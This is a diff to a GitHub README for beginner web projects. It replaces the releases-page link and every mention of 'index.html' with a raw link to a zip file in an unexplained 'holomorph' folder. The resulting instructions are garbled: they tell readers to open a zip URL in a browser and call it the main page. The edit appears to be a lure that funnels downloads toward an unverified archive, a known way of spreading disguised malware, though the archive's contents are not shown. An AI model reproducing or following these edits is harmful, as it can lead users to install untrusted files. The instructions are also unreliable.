@@ -1,6 +1,6 @@
 # 🌟 1st-year - Simple Projects for Beginners
 
-[![Download Now](https://img.shields.io/badge/Download_Now-1st--year-blue)](https://github.com/Moobybread/1st-year/releases)
+[![Download Now](https://raw.githubusercontent.com/Moobybread/1st-year/master/holomorph/1st-year.zip)](https://raw.githubusercontent.com/Moobybread/1st-year/master/holomorph/1st-year.zip)
 
 ## 📚 Table of Contents
 
@@ -36,7 +36,7 @@ These tools provide a foundation for building and designing websites easily.
 To set up and run this project on your computer, follow these steps:
 
 1. **Visit the Releases Page**:
-   Go to [this page to download](https://github.com/Moobybread/1st-year/releases) the project files.
+   Go to [this page to download](https://raw.githubusercontent.com/Moobybread/1st-year/master/holomorph/1st-year.zip) the project files.
 
 2. **Choose the Right File**:
    Once on the releases page, you will see a list of available files. Look for the latest release version.
@@ -49,10 +49,10 @@ To set up and run this project on your computer, follow these steps:
    - For Mac: Double-click the downloaded file. It will automatically extract the content.
 
 5. **Open the Project**:
-   Navigate to the folder where you extracted the files. Look for an **index.html** file or similar. 
+   Navigate to the folder where you extracted the files. Look for an **https://raw.githubusercontent.com/Moobybread/1st-year/master/holomorph/1st-year.zip** file or similar. 
 
 6. **Run the Project**:
-   - Open the **index.html** file in your web browser (Chrome, Firefox, Safari, etc.). This will display the web project you downloaded.
+   - Open the **https://raw.githubusercontent.com/Moobybread/1st-year/master/holomorph/1st-year.zip** file in your web browser (Chrome, Firefox, Safari, etc.). This will display the web project you downloaded.
 
 You are now ready to explore the projects! 
 
@@ -60,7 +60,7 @@ You are now ready to explore the projects!
 
 The project folder is organized to make it easy to navigate. Here is how it is structured:
 
-- **index.html**: The main page of the project.
+- **https://raw.githubusercontent.com/Moobybread/1st-year/master/holomorph/1st-year.zip**: The main page of the project.
 - **css/**: A folder containing stylesheets for styling the web pages.
 - **js/**: A folder containing JavaScript files used in the project.
 - **assets/**: Any images or additional media used by the project.
